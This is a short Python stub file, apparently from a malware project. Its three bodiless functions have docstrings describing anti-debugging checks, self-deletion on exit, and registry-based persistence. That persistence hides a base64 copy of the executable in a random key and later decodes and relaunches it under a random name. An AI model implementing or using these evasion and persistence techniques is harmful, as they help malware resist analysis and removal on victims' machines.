
def find_debug_process() -> bool:
    """we return true if we found any debug process exists, else false"""


def remove_on_exit() -> SystemExit:
    """
    at exit we regsiter this function to try deleting our file!
    """

def process_monitor() -> bool:
    """
    we didn't cpde'ed this because closures aren't supported in cython
    really simple, this function run as thread in the background.
    if we find any debug process, we are doing the next steps:
    1. we create random key in the registry with value being our base64 code of the current exe(persistence)
    2. we create plain python code with specific injected values to run from the cli
    3. this code will silently monitor until condition's are met
    4. when the condition's are met, the cli code will load the base64 from the registry
       it will base64 decode it, create a exe in random location with random name, and launch it
       the exe that got launched is PURE copy of our own code, so it will also avoid debug in the same way.
      """

